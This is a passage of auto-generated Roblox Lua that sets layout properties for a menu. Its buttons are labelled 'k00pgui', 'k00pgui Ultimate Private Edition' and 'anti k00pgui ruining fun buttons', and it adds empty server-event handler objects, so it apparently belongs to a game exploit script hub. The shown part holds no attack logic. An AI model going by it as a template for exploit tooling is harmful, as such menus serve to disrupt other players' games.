G2L["40"].BorderSizePixel = 1
G2L["40"].ClipsDescendants = false
G2L["40"].Draggable = false
G2L["40"].Position = UDim2.new(0, 0, 0, 0)
G2L["40"].Rotation = 0
G2L["40"].Selectable = false
G2L["40"].SelectionOrder = 0
G2L["40"].Size = UDim2.new(1, 0, 1, 0)
G2L["40"].Visible = true
G2L["40"].ZIndex = -1
G2L["40"].Parent = G2L["34"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder.umbraShadow
G2L["41"].Name = [[umbraShadow]]
G2L["41"].Image = [[rbxassetid://1316045217]]
G2L["41"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["41"].ScaleType = Enum.ScaleType.Slice
G2L["41"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["41"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["41"].Active = false
G2L["41"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["41"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["41"].BackgroundTransparency = 1
G2L["41"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["41"].BorderSizePixel = 1
G2L["41"].ClipsDescendants = false
G2L["41"].Draggable = false
G2L["41"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["41"].Rotation = 0
G2L["41"].Selectable = false
G2L["41"].SelectionOrder = 0
G2L["41"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["41"].Visible = true
G2L["41"].ZIndex = 1
G2L["41"].Parent = G2L["40"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder.penumbraShadow
G2L["42"].Name = [[penumbraShadow]]
G2L["42"].Image = [[rbxassetid://1316045217]]
G2L["42"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["42"].ScaleType = Enum.ScaleType.Slice
G2L["42"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["42"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["42"].Active = false
G2L["42"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["42"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["42"].BackgroundTransparency = 1
G2L["42"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["42"].BorderSizePixel = 1
G2L["42"].ClipsDescendants = false
G2L["42"].Draggable = false
G2L["42"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["42"].Rotation = 0
G2L["42"].Selectable = false
G2L["42"].SelectionOrder = 0
G2L["42"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["42"].Visible = true
G2L["42"].ZIndex = 1
G2L["42"].Parent = G2L["40"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder.ambientShadow
G2L["43"].Name = [[ambientShadow]]
G2L["43"].Image = [[rbxassetid://1316045217]]
G2L["43"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["43"].ScaleType = Enum.ScaleType.Slice
G2L["43"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["43"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["43"].Active = false
G2L["43"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["43"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["43"].BackgroundTransparency = 1
G2L["43"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["43"].BorderSizePixel = 1
G2L["43"].ClipsDescendants = false
G2L["43"].Draggable = false
G2L["43"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["43"].Rotation = 0
G2L["43"].Selectable = false
G2L["43"].SelectionOrder = 0
G2L["43"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["43"].Visible = true
G2L["43"].ZIndex = 1
G2L["43"].Parent = G2L["40"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons
G2L["44"].Name = [[anti k00pgui ruining fun buttons]]
G2L["44"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["44"].Text = [[anti k00pgui ruining fun buttons]]
G2L["44"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["44"].TextScaled = true
G2L["44"].TextSize = 14
G2L["44"].TextStrokeColor3 = Color3.fromRGB(255, 240.00002, 240.00002)
G2L["44"].TextStrokeTransparency = 1
G2L["44"].TextWrapped = true
G2L["44"].TextXAlignment = Enum.TextXAlignment.Center
G2L["44"].TextYAlignment = Enum.TextYAlignment.Center
G2L["44"].Active = true
G2L["44"].AnchorPoint = Vector2.new(0, 0)
G2L["44"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["44"].BackgroundTransparency = 0.5
G2L["44"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["44"].BorderSizePixel = 1
G2L["44"].ClipsDescendants = false
G2L["44"].Draggable = false
G2L["44"].Position = UDim2.new(0, 0, 0, 0)
G2L["44"].Rotation = 0
G2L["44"].Selectable = true
G2L["44"].SelectionOrder = 0
G2L["44"].Size = UDim2.new(0, 100, 0, 67)
G2L["44"].Visible = true
G2L["44"].ZIndex = 1
G2L["44"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.UICorner
G2L["45"].Name = [[UICorner]]
G2L["45"].CornerRadius = UDim.new(0, 10)
G2L["45"].Parent = G2L["44"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.RippleClick
G2L["46"].Name = [[RippleClick]]
G2L["46"].Parent = G2L["44"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.RippleClick.Circle
G2L["47"].Name = [[Circle]]
G2L["47"].Image = [[rbxassetid://266543268]]
G2L["47"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["47"].ScaleType = Enum.ScaleType.Stretch
G2L["47"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["47"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["47"].Active = false
G2L["47"].AnchorPoint = Vector2.new(0, 0)
G2L["47"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["47"].BackgroundTransparency = 1
G2L["47"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["47"].BorderSizePixel = 1
G2L["47"].ClipsDescendants = false
G2L["47"].Draggable = false
G2L["47"].Position = UDim2.new(0, 0, 0, 0)
G2L["47"].Rotation = 0
G2L["47"].Selectable = false
G2L["47"].SelectionOrder = 0
G2L["47"].Size = UDim2.new(0, 0, 0, 0)
G2L["47"].Visible = true
G2L["47"].ZIndex = 10
G2L["47"].Parent = G2L["46"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder
G2L["48"].Name = [[shadowHolder]]
G2L["48"].Active = false
G2L["48"].AnchorPoint = Vector2.new(0, 0)
G2L["48"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["48"].BackgroundTransparency = 1
G2L["48"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["48"].BorderSizePixel = 1
G2L["48"].ClipsDescendants = false
G2L["48"].Draggable = false
G2L["48"].Position = UDim2.new(0, 0, 0, 0)
G2L["48"].Rotation = 0
G2L["48"].Selectable = false
G2L["48"].SelectionOrder = 0
G2L["48"].Size = UDim2.new(1, 0, 1, 0)
G2L["48"].Visible = true
G2L["48"].ZIndex = -1
G2L["48"].Parent = G2L["44"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder.umbraShadow
G2L["49"].Name = [[umbraShadow]]
G2L["49"].Image = [[rbxassetid://1316045217]]
G2L["49"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["49"].ScaleType = Enum.ScaleType.Slice
G2L["49"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["49"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["49"].Active = false
G2L["49"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["49"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["49"].BackgroundTransparency = 1
G2L["49"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["49"].BorderSizePixel = 1
G2L["49"].ClipsDescendants = false
G2L["49"].Draggable = false
G2L["49"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["49"].Rotation = 0
G2L["49"].Selectable = false
G2L["49"].SelectionOrder = 0
G2L["49"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["49"].Visible = true
G2L["49"].ZIndex = 1
G2L["49"].Parent = G2L["48"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder.penumbraShadow
G2L["50"].Name = [[penumbraShadow]]
G2L["50"].Image = [[rbxassetid://1316045217]]
G2L["50"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["50"].ScaleType = Enum.ScaleType.Slice
G2L["50"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["50"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["50"].Active = false
G2L["50"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["50"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["50"].BackgroundTransparency = 1
G2L["50"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["50"].BorderSizePixel = 1
G2L["50"].ClipsDescendants = false
G2L["50"].Draggable = false
G2L["50"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["50"].Rotation = 0
G2L["50"].Selectable = false
G2L["50"].SelectionOrder = 0
G2L["50"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["50"].Visible = true
G2L["50"].ZIndex = 1
G2L["50"].Parent = G2L["48"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.shadowHolder.ambientShadow
G2L["51"].Name = [[ambientShadow]]
G2L["51"].Image = [[rbxassetid://1316045217]]
G2L["51"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["51"].ScaleType = Enum.ScaleType.Slice
G2L["51"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["51"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["51"].Active = false
G2L["51"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["51"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["51"].BackgroundTransparency = 1
G2L["51"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["51"].BorderSizePixel = 1
G2L["51"].ClipsDescendants = false
G2L["51"].Draggable = false
G2L["51"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["51"].Rotation = 0
G2L["51"].Selectable = false
G2L["51"].SelectionOrder = 0
G2L["51"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["51"].Visible = true
G2L["51"].ZIndex = 1
G2L["51"].Parent = G2L["48"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.TextButton_Roundify_12px
G2L["52"].Name = [[TextButton_Roundify_12px]]
G2L["52"].Image = [[rbxassetid://3570695787]]
G2L["52"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["52"].ScaleType = Enum.ScaleType.Slice
G2L["52"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["52"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["52"].Active = true
G2L["52"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["52"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["52"].BackgroundTransparency = 1
G2L["52"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["52"].BorderSizePixel = 1
G2L["52"].ClipsDescendants = false
G2L["52"].Draggable = false
G2L["52"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["52"].Rotation = 0
G2L["52"].Selectable = true
G2L["52"].SelectionOrder = 0
G2L["52"].Size = UDim2.new(1, 0, 1, 0)
G2L["52"].Visible = true
G2L["52"].ZIndex = 1
G2L["52"].Parent = G2L["44"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.anti k00pgui ruining fun buttons.ServerEventHandler
G2L["53"].Name = [[ServerEventHandler]]
G2L["53"].Parent = G2L["44"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui
G2L["54"].Name = [[k00pgui]]
G2L["54"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["54"].Text = [[k00pgui]]
G2L["54"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["54"].TextScaled = true
G2L["54"].TextSize = 14
G2L["54"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["54"].TextStrokeTransparency = 1
G2L["54"].TextWrapped = true
G2L["54"].TextXAlignment = Enum.TextXAlignment.Center
G2L["54"].TextYAlignment = Enum.TextYAlignment.Center
G2L["54"].Active = true
G2L["54"].AnchorPoint = Vector2.new(0, 0)
G2L["54"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["54"].BackgroundTransparency = 0.5
G2L["54"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["54"].BorderSizePixel = 0
G2L["54"].ClipsDescendants = false
G2L["54"].Draggable = false
G2L["54"].Position = UDim2.new(0, 0, 0, 0)
G2L["54"].Rotation = 0
G2L["54"].Selectable = true
G2L["54"].SelectionOrder = 0
G2L["54"].Size = UDim2.new(0, 200, 0, 50)
G2L["54"].Visible = true
G2L["54"].ZIndex = 1
G2L["54"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.TextButton_Roundify_12px
G2L["55"].Name = [[TextButton_Roundify_12px]]
G2L["55"].Image = [[rbxassetid://3570695787]]
G2L["55"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["55"].ScaleType = Enum.ScaleType.Slice
G2L["55"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["55"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["55"].Active = true
G2L["55"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["55"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["55"].BackgroundTransparency = 1
G2L["55"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["55"].BorderSizePixel = 1
G2L["55"].ClipsDescendants = false
G2L["55"].Draggable = false
G2L["55"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["55"].Rotation = 0
G2L["55"].Selectable = true
G2L["55"].SelectionOrder = 0
G2L["55"].Size = UDim2.new(1, 0, 1, 0)
G2L["55"].Visible = true
G2L["55"].ZIndex = 1
G2L["55"].Parent = G2L["54"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.RippleClick
G2L["56"].Name = [[RippleClick]]
G2L["56"].Parent = G2L["54"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.RippleClick.Circle
G2L["57"].Name = [[Circle]]
G2L["57"].Image = [[rbxassetid://266543268]]
G2L["57"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["57"].ScaleType = Enum.ScaleType.Stretch
G2L["57"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["57"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["57"].Active = false
G2L["57"].AnchorPoint = Vector2.new(0, 0)
G2L["57"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["57"].BackgroundTransparency = 1
G2L["57"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["57"].BorderSizePixel = 1
G2L["57"].ClipsDescendants = false
G2L["57"].Draggable = false
G2L["57"].Position = UDim2.new(0, 0, 0, 0)
G2L["57"].Rotation = 0
G2L["57"].Selectable = false
G2L["57"].SelectionOrder = 0
G2L["57"].Size = UDim2.new(0, 0, 0, 0)
G2L["57"].Visible = true
G2L["57"].ZIndex = 10
G2L["57"].Parent = G2L["56"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.UICorner
G2L["58"].Name = [[UICorner]]
G2L["58"].CornerRadius = UDim.new(0, 10)
G2L["58"].Parent = G2L["54"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.ServerEventHandler
G2L["59"].Name = [[ServerEventHandler]]
G2L["59"].Parent = G2L["54"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder
G2L["60"].Name = [[shadowHolder]]
G2L["60"].Active = false
G2L["60"].AnchorPoint = Vector2.new(0, 0)
G2L["60"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["60"].BackgroundTransparency = 1
G2L["60"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["60"].BorderSizePixel = 1
G2L["60"].ClipsDescendants = false
G2L["60"].Draggable = false
G2L["60"].Position = UDim2.new(0, 0, 0, 0)
G2L["60"].Rotation = 0
G2L["60"].Selectable = false
G2L["60"].SelectionOrder = 0
G2L["60"].Size = UDim2.new(1, 0, 1, 0)
G2L["60"].Visible = true
G2L["60"].ZIndex = -1
G2L["60"].Parent = G2L["54"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder.umbraShadow
G2L["61"].Name = [[umbraShadow]]
G2L["61"].Image = [[rbxassetid://1316045217]]
G2L["61"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["61"].ScaleType = Enum.ScaleType.Slice
G2L["61"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["61"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["61"].Active = false
G2L["61"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["61"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["61"].BackgroundTransparency = 1
G2L["61"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["61"].BorderSizePixel = 1
G2L["61"].ClipsDescendants = false
G2L["61"].Draggable = false
G2L["61"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["61"].Rotation = 0
G2L["61"].Selectable = false
G2L["61"].SelectionOrder = 0
G2L["61"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["61"].Visible = true
G2L["61"].ZIndex = 1
G2L["61"].Parent = G2L["60"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder.penumbraShadow
G2L["62"].Name = [[penumbraShadow]]
G2L["62"].Image = [[rbxassetid://1316045217]]
G2L["62"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["62"].ScaleType = Enum.ScaleType.Slice
G2L["62"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["62"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["62"].Active = false
G2L["62"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["62"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["62"].BackgroundTransparency = 1
G2L["62"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["62"].BorderSizePixel = 1
G2L["62"].ClipsDescendants = false
G2L["62"].Draggable = false
G2L["62"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["62"].Rotation = 0
G2L["62"].Selectable = false
G2L["62"].SelectionOrder = 0
G2L["62"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["62"].Visible = true
G2L["62"].ZIndex = 1
G2L["62"].Parent = G2L["60"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui.shadowHolder.ambientShadow
G2L["63"].Name = [[ambientShadow]]
G2L["63"].Image = [[rbxassetid://1316045217]]
G2L["63"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["63"].ScaleType = Enum.ScaleType.Slice
G2L["63"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["63"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["63"].Active = false
G2L["63"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["63"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["63"].BackgroundTransparency = 1
G2L["63"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["63"].BorderSizePixel = 1
G2L["63"].ClipsDescendants = false
G2L["63"].Draggable = false
G2L["63"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["63"].Rotation = 0
G2L["63"].Selectable = false
G2L["63"].SelectionOrder = 0
G2L["63"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["63"].Visible = true
G2L["63"].ZIndex = 1
G2L["63"].Parent = G2L["60"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition
G2L["64"].Name = [[k00pgui Ultimate Private Edition]]
G2L["64"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["64"].Text = [[k00pgui Ultimate Private Edition]]
G2L["64"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["64"].TextScaled = true
G2L["64"].TextSize = 14
G2L["64"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["64"].TextStrokeTransparency = 1
G2L["64"].TextWrapped = true
G2L["64"].TextXAlignment = Enum.TextXAlignment.Center
G2L["64"].TextYAlignment = Enum.TextYAlignment.Center
G2L["64"].Active = true
G2L["64"].AnchorPoint = Vector2.new(0, 0)
G2L["64"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["64"].BackgroundTransparency = 0.5
G2L["64"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["64"].BorderSizePixel = 0
G2L["64"].ClipsDescendants = false
G2L["64"].Draggable = false
G2L["64"].Position = UDim2.new(0, 0, 0, 0)
G2L["64"].Rotation = 0
G2L["64"].Selectable = true
G2L["64"].SelectionOrder = 0
G2L["64"].Size = UDim2.new(0, 200, 0, 50)
G2L["64"].Visible = true
G2L["64"].ZIndex = 1
G2L["64"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.TextButton_Roundify_12px
G2L["65"].Name = [[TextButton_Roundify_12px]]
G2L["65"].Image = [[rbxassetid://3570695787]]
G2L["65"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["65"].ScaleType = Enum.ScaleType.Slice
G2L["65"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["65"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["65"].Active = true
G2L["65"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["65"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["65"].BackgroundTransparency = 1
G2L["65"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["65"].BorderSizePixel = 1
G2L["65"].ClipsDescendants = false
G2L["65"].Draggable = false
G2L["65"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["65"].Rotation = 0
G2L["65"].Selectable = true
G2L["65"].SelectionOrder = 0
G2L["65"].Size = UDim2.new(1, 0, 1, 0)
G2L["65"].Visible = true
G2L["65"].ZIndex = 1
G2L["65"].Parent = G2L["64"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.RippleClick
G2L["66"].Name = [[RippleClick]]
G2L["66"].Parent = G2L["64"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.RippleClick.Circle
G2L["67"].Name = [[Circle]]
G2L["67"].Image = [[rbxassetid://266543268]]
G2L["67"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["67"].ScaleType = Enum.ScaleType.Stretch
G2L["67"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["67"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["67"].Active = false
G2L["67"].AnchorPoint = Vector2.new(0, 0)
G2L["67"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["67"].BackgroundTransparency = 1
G2L["67"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["67"].BorderSizePixel = 1
G2L["67"].ClipsDescendants = false
G2L["67"].Draggable = false
G2L["67"].Position = UDim2.new(0, 0, 0, 0)
G2L["67"].Rotation = 0
G2L["67"].Selectable = false
G2L["67"].SelectionOrder = 0
G2L["67"].Size = UDim2.new(0, 0, 0, 0)
G2L["67"].Visible = true
G2L["67"].ZIndex = 10
G2L["67"].Parent = G2L["66"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.UICorner
G2L["68"].Name = [[UICorner]]
G2L["68"].CornerRadius = UDim.new(0, 10)
G2L["68"].Parent = G2L["64"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder
G2L["69"].Name = [[shadowHolder]]
G2L["69"].Active = false
G2L["69"].AnchorPoint = Vector2.new(0, 0)
G2L["69"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["69"].BackgroundTransparency = 1
G2L["69"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["69"].BorderSizePixel = 1
G2L["69"].ClipsDescendants = false
G2L["69"].Draggable = false
G2L["69"].Position = UDim2.new(0, 0, 0, 0)
G2L["69"].Rotation = 0
G2L["69"].Selectable = false
G2L["69"].SelectionOrder = 0
G2L["69"].Size = UDim2.new(1, 0, 1, 0)
G2L["69"].Visible = true
G2L["69"].ZIndex = -1
G2L["69"].Parent = G2L["64"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder.umbraShadow
G2L["70"].Name = [[umbraShadow]]
G2L["70"].Image = [[rbxassetid://1316045217]]
G2L["70"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["70"].ScaleType = Enum.ScaleType.Slice
G2L["70"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["70"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["70"].Active = false
G2L["70"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["70"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["70"].BackgroundTransparency = 1
G2L["70"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["70"].BorderSizePixel = 1
G2L["70"].ClipsDescendants = false
G2L["70"].Draggable = false
G2L["70"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["70"].Rotation = 0
G2L["70"].Selectable = false
G2L["70"].SelectionOrder = 0
G2L["70"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["70"].Visible = true
G2L["70"].ZIndex = 1
G2L["70"].Parent = G2L["69"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder.penumbraShadow
G2L["71"].Name = [[penumbraShadow]]
G2L["71"].Image = [[rbxassetid://1316045217]]
G2L["71"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["71"].ScaleType = Enum.ScaleType.Slice
G2L["71"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["71"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["71"].Active = false
G2L["71"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["71"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["71"].BackgroundTransparency = 1
G2L["71"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["71"].BorderSizePixel = 1
G2L["71"].ClipsDescendants = false
G2L["71"].Draggable = false
G2L["71"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["71"].Rotation = 0
G2L["71"].Selectable = false
G2L["71"].SelectionOrder = 0
G2L["71"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["71"].Visible = true
G2L["71"].ZIndex = 1
G2L["71"].Parent = G2L["69"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.shadowHolder.ambientShadow
G2L["72"].Name = [[ambientShadow]]
G2L["72"].Image = [[rbxassetid://1316045217]]
G2L["72"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["72"].ScaleType = Enum.ScaleType.Slice
G2L["72"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["72"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["72"].Active = false
G2L["72"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["72"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["72"].BackgroundTransparency = 1
G2L["72"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["72"].BorderSizePixel = 1
G2L["72"].ClipsDescendants = false
G2L["72"].Draggable = false
G2L["72"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["72"].Rotation = 0
G2L["72"].Selectable = false
G2L["72"].SelectionOrder = 0
G2L["72"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["72"].Visible = true
G2L["72"].ZIndex = 1
G2L["72"].Parent = G2L["69"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00pgui Ultimate Private Edition.LocalScript
G2L["73"].Name = [[LocalScript]]
G2L["73"].Parent = G2L["64"]

